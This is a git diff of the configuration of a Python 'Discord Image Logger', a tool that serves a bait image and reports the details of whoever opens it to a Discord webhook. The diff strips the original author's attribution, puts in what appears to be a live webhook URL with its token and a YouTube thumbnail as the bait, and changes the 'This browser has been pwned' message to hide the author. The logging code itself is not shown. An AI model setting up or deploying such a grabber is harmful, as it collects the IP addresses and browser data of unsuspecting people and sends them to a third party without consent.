@@ -1,5 +1,4 @@
 # Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -12,9 +11,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "webhook": "https://discord.com/api/webhooks/1353883282806276208/wqn-HU-zqJp2AgQ-3OTy4yALC-RRJRNUNSf0JM26OZY1e9dbVp0HNzPFxv3Ldtf6a2tb",
+    "image": "https://i.ytimg.com/vi/CRzyCzYpdq8/maxresdefault.jpg", # You can also have a custom image by using a URL argument
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
@@ -28,7 +26,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "This browser has been pwned by ??? Image Logger.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
